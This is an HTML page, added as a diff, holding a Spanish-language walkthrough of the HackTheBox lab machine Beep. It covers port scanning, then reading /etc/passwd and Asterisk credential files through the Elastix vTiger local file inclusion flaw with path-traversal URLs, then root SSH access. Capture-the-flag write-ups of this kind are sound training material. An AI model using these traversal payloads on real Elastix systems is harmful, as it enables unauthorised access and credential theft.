@@ -1,0 +1,131 @@
+<!-- Machine: Beep -->
+
+<div id="machine-beep" class="page-content" style="display: none;">
+    <div class="machine-page">
+        <div class="machine-page-header">
+            <div class="machine-page-title-section">
+                <h1 class="machine-page-title">📞 Beep</h1>
+                <div class="machine-badges">
+                    <span class="badge difficulty-easy">Explorador Novato</span>
+                    <span class="badge badge-platform">HackTheBox</span>
+                </div>
+            </div>
+            <p class="machine-description">
+                En los confines del sector digital 10.10.10.7, la estación Beep ejecuta múltiples 
+                servicios de comunicación intergaláctica. Esta fortaleza Linux presenta vectores 
+                de infiltración a través de servicios web vulnerables, incluyendo el sistema 
+                Elastix con fallas críticas de LFI que permiten el acceso inicial y la conquista total.
+            </p>
+        </div>
+
+        <div class="machine-image-section">
+            <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop&crop=entropy" 
+                 alt="Beep Space Station" 
+                 class="machine-image">
+        </div>
+
+        <div class="notes-section">
+            <h2 class="notes-title">
+                <span>📋</span>
+                Registro de Infiltración
+            </h2>
+
+            <div class="step">
+                <h3 class="step-title">🛸 Fase de Reconocimiento</h3>
+                <p class="step-content">
+                    Iniciamos el escaneo de la estación objetivo para mapear todos los puertos 
+                    y servicios activos en el sistema:
+                </p>
+                <div class="code-block">
+                    <pre><code># Escaneo completo de puertos y servicios
+nmap -sC -sV -oN beep_recon.nmap 10.10.10.7
+
+# Escaneo UDP para servicios ocultos
+nmap -sU --top-ports 1000 10.10.10.7</code></pre>
+                </div>
+                <p class="step-content">
+                    <strong>Servicios detectados en la estación:</strong><br>
+                    • Puerto 22: SSH OpenSSH 4.3<br>
+                    • Puerto 80: HTTP Apache 2.2.3<br>
+                    • Puerto 443: HTTPS Apache 2.2.3<br>
+                    • Puerto 110: POP3 Cyrus<br>
+                    • Puerto 143: IMAP Cyrus<br>
+                    • Múltiples puertos adicionales identificados
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">🌐 Exploración de Interfaces Web</h3>
+                <p class="step-content">
+                    Procedemos a analizar los servicios web disponibles en los puertos 80 y 443 
+                    para identificar puntos de entrada potenciales:
+                </p>
+                <div class="code-block">
+                    <pre><code># Reconocimiento de servicios HTTPS
+curl -k https://10.10.10.7/
+
+# Enumeración de directorios
+gobuster dir -u https://10.10.10.7/ \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-k -x php,txt,html
+
+# Análisis de certificados SSL
+openssl s_client -connect 10.10.10.7:443</code></pre>
+                </div>
+                <p class="step-content">
+                    <strong>Descubrimiento crítico:</strong> La estación ejecuta <strong>Elastix</strong>, 
+                    un sistema de telefonía IP que presenta múltiples vulnerabilidades conocidas, 
+                    incluyendo Local File Inclusion (LFI) catalogada como CVE-2012-4869.
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">⚡ Explotación del Vector LFI</h3>
+                <p class="step-content">
+                    Aprovechamos la vulnerabilidad LFI en el módulo vTiger CRM de Elastix 
+                    para acceder a archivos críticos del sistema:
+                </p>
+                <div class="code-block">
+                    <pre><code># Exploit LFI - Lectura de /etc/passwd
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../etc/passwd%00&module=Accounts&action
+
+# Extracción de configuraciones sensibles
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../etc/asterisk/manager.conf%00&module=Accounts&action
+
+# Búsqueda de credenciales en logs
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../var/log/asterisk/messages%00&module=Accounts&action</code></pre>
+                </div>
+                <p class="step-content">
+                    Durante la extracción de archivos, conseguimos obtener credenciales válidas 
+                    del sistema almacenadas en archivos de configuración de Asterisk y FreePBX.
+                </p>
+            </div>
+
+            <div class="step">
+                <h3 class="step-title">👑 Conquista Total del Sistema</h3>
+                <p class="step-content">
+                    Con las credenciales obtenidas, establecemos conexión SSH directa y 
+                    escalamos privilegios para obtener control total de la estación:
+                </p>
+                <div class="code-block">
+                    <pre><code># Acceso SSH con credenciales extraídas
+ssh root@10.10.10.7
+
+# Verificación de permisos administrativos
+whoami && id
+
+# Captura de objetivos
+cat /home/*/user.txt
+cat /root/root.txt</code></pre>
+                </div>
+                <div class="success-box">
+                    <p class="success-text">
+                        <span>🎯</span>
+                        <strong>Misión Completada:</strong> Estación Beep conquistada con éxito. 
+                        Acceso root obtenido y flags capturadas.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
